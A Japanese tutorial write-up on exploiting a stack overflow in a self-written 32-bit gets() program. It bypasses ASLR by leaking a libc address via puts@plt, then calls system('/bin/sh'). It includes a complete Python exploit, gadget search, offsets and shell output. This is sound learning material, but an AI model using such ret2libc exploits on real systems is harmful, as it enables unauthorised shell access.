# PWNオーバーフロー入門: ASLR有効状態でアドレスリークを利用してシェルを起動 (SSP、PIE無効で32bit ELF)

## はじめに

Classic Pwnを解くのにまだ知識が足りないことでへこんだのだけど気を取り直してアドレスリークを利用したASLR迂回に挑戦。

## 攻撃対象のコード

今までのコードと若干変えてあるけど基本的にはgetsとputsを使ったコード。
今までのコードでも行けなくは無さそうなんだけどデバッグが面倒くさかったのでデバッグしやすい形に変更した。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void saru()
{
  char buf[128];

  puts("password?: ");
  fflush(stdout);
  gets(buf);
  puts("thank you!");
  fflush(stdout);
}

int main(){
  saru();

  return 0;
}
```

## 攻撃対象のコードのコンパイル及び準備

コンパイルとASLRの有効化。

```bash-statement
saru@lucifen:~/pwn009$ gcc -m32 -fno-stack-protector -no-pie overflow009.c -o overflow009
overflow009.c: In function ‘saru’:
overflow009.c:9:3: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
   gets(buf);
   ^~~~
   fgets
/tmp/ccJVdAhL.o: In function `saru':
overflow009.c:(.text+0x20): warning: the `gets' function is dangerous and should not be used.
saru@lucifen:~/pwn009$ sudo sysctl -w kernel.randomize_va_space=2
kernel.randomize_va_space = 2
saru@lucifen:~/pwn009$
```

## 関連する情報調べ

ASLR有効でもプログラム本体のアドレスは変わらない。変わるのは
1. mmap(共有ライブラリ)のアドレス
2. heapのアドレス
3. stackのアドレス
の3つだけ。
この3つは相対アドレスを調べて、本体は絶対アドレスを調べて、後はリークアドレスを組み合わせる必要がある。

### gets@plt、puts@plt

- 0x08048360: puts_plt
- 0x0804a018: libc_start_main_got

```
saru@lucifen:~/pwn009$ objdump -d -Mintel overflow009
08048360 <puts@plt>:
 8048360:       ff 25 14 a0 04 08       jmp    DWORD PTR ds:0x804a014
 8048366:       68 10 00 00 00          push   0x10
 804836b:       e9 c0 ff ff ff          jmp    8048330 <.plt>

08048370 <__libc_start_main@plt>:
 8048370:       ff 25 18 a0 04 08       jmp    DWORD PTR ds:0x804a018
 8048376:       68 18 00 00 00          push   0x18
 804837b:       e9 b0 ff ff ff          jmp    8048330 <.plt>
```


### bufからreturn addressまでの距離

たぶん今までと同じ140だろうけどgdb-pedaを使って簡単に調べることができることを知ったのでやってみる。

```
gdb-peda$ pattern_create 150
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA'
gdb-peda$ run
Starting program: /home/saru/pwn009/overflow009
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA

[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41416d41
[------------------------------------stack-------------------------------------]
0000| 0xffffd4e0 ("RAAoAA")
0004| 0xffffd4e4 --> 0xff004141
0008| 0xffffd4e8 --> 0x0
0012| 0xffffd4ec --> 0xf7e04e81 (<__libc_start_main+241>:       add    esp,0x10)
0016| 0xffffd4f0 --> 0xf7fc1000 --> 0x1d4d6c
0020| 0xffffd4f4 --> 0xf7fc1000 --> 0x1d4d6c
0024| 0xffffd4f8 --> 0x0
0028| 0xffffd4fc --> 0xf7e04e81 (<__libc_start_main+241>:       add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41416d41 in ?? ()
gdb-peda$ pattern_offset RAAo
RAAoAA found at offset: 144
gdb-peda$
```

というわけでやはり141～144を書き換えれば良さそう。

### libc内の相対アドレス


```
saru@lucifen:~/pwn009$ nm -D /lib32/libc.so.6 | grep "system"
0003cd10 T __libc_system
00127190 T svcerr_systemerr
0003cd10 W system
saru@lucifen:~/pwn009$
```

```
saru@lucifen:~/pwn009$ nm -D /lib32/libc.so.6 | grep libc_start_main
00018d90 T __libc_start_main
saru@lucifen:~/pwn009$
```
```
saru@lucifen:~/pwn009$ strings -tx /lib32/libc-2.27.so  | grep "/bin/sh"
 17b8cf /bin/sh
saru@lucifen:~/pwn009$
```
まとめると

- 0x0003cd10: system_rel
- 0x00018d90: libc_start_main_rel
- 0x0017b8cf: binsh_rel

### gadget

今回はpop1回のgadegetで良さそう。

rp++を使った。

```
$ wget https://github.com/downloads/0vercl0k/rp/rp-lin-x86
$ chmod 755 rp-lin-x86
```

```
saru@lucifen:~/pwn009$ ./rp-lin-x86 -r 1 --unique --file=./overflow09 | grep pop
0x080485bb: pop ebp ; ret  ;  (1 found)
0x0804832d: pop ebx ; ret  ;  (2 found)
saru@lucifen:~/pwn009$
```

`leave`は`mov esp, ebp; pop ebp`と等しい動作らしい。

## やること

1. getsのオーバフローを利用して書き換え
2. return-to-pltでputsでlibcのロードドレスを調べる
   1. putsでlibc_start_mainのアドレスを出力
3. return-to-pltでmainに飛ばして再度書き換え
4. 2.で取得したlibcのロードアドレスを利用してsystem("/bin/sh")を呼び出し

### exploitコード

さすがに長くなってきた。

```python
import struct
import sys
import socket
import time
import telnetlib


bufsize = 140
popret = 0x080485bb
main_addr = 0x0804851f
libc_start_main_got = 0x804a018
puts_plt = 0x08048360

libc_start_main_rel = 0x00018d90
system_rel = 0x0003cd10
binsh_rel = 0x0017b8cf



def dump_param():
    print("pop_ecx_pop_eax = 0x%x" % (pop_ecx_pop_eax))



def p(val):
    return struct.pack('<I', val)



def u(val):
    return struct.unpack('<I', val)[0]



def read_until(sock, s):
    line = b""
    while line.find(s) < 0:
        line += sock.recv(1)



def main():
    buf = b'A' * bufsize
    buf += p(puts_plt)
    buf += p(popret)
    buf += p(libc_start_main_got)
    buf += p(main_addr)
    buf += b'\n'

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    sock.connect(("localhost", 28080))
    time.sleep(1)
    read_until(sock, b"password?: \n")
    print("password?: ")
    time.sleep(1)
    ret = sock.sendall(buf)
    time.sleep(1)

    read_until(sock, b"thank you!\n")
    print("thank you!")
    time.sleep(1)

    val = sock.recv(4)
    print(len(val))
    libc_start_main_addr = u(val)
    print("%x" % (libc_start_main_addr))
    libc_base = libc_start_main_addr - libc_start_main_rel
    print("%x" % (libc_base))
    system_addr = libc_base + system_rel
    binsh_addr = libc_base + binsh_rel

    read_until(sock, b"\n")
    time.sleep(1);

    buf = b'A' * bufsize
    buf += p(system_addr)
    buf += b'A' * 4
    buf += p(binsh_addr)
    buf += b'\n'

    time.sleep(1)
    read_until(sock, b"password?: \n")
    print("password?: ")

    time.sleep(1)
    ret = sock.sendall(buf)
    time.sleep(1)
    read_until(sock, b"thank you!\n")

    print("interact mode")
    t = telnetlib.Telnet()
    t.sock = sock
    t.interact()



if __name__ == "__main__":
    main()
```

## サーバの立ち上げ

今まで使ってた自作のpwn_server.pyと同じ動きをするsocatなるものの存在を知る．．．まぁデバッグに使えるからいいか。

```
saru@lucifen:~/pwn009$ socat TCP-LISTEN:28080,reuseaddr,fork EXEC:./overflow09
```

## 実行結果

```
saru@lucifen:~/pwn009$ python exploit09.py
password?:
thank you!
4
f7db3d90
f7d9b000
password?:
interact mode

cat flag.txt
flag is HANDAI_CTF

exit
*** Connection closed by remote host ***
saru@lucifen:~/pwn009$
```

## 参考文献

- [Smashing the stack bypassing ASLR+PIE+DEP+SSP(+RELRO) - ももいろテクノロジー](http://inaz2.hatenablog.com/entry/2014/07/01/013706)
